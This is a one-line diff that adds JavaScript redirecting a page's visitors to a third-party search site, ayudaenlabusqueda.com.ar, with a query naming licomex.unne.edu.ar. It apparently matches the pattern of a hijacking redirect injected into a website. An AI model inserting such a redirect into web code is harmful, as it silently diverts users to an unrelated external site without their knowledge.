@@ -1,0 +1,1 @@
+document.location="http://www.ayudaenlabusqueda.com.ar/?query=licomex unne edu&curl=licomex.unne.edu.ar";
